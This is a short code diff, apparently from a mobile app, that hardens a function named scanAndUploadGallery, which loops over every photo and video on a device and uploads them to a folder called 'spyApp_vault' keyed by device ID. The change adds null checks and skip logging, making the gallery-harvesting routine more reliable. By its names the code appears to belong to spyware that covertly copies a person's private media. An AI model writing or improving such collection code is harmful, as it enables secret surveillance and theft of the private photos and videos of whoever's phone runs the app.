@@ -67,7 +67,11 @@ export const scanAndUploadGallery = async (
   const targetFolder = `spyApp_vault/${deviceId}`;
 
   for (let idx = 0; idx < photos.edges.length; idx++) {
-    const node = photos.edges[idx].node as any;
+    const node = photos.edges[idx]?.node as any;
+    if (!node || !node.image || !node.image.uri) {
+      console.log(`[Gallery] Item ${idx + 1}: SKIP (invalid node or missing image/video URI)`);
+      continue;
+    }
     const fileUri = node.image.uri;
     const isVideo = node.type && node.type.startsWith('video');
     const fileId = fileUri; // URI as unique ID
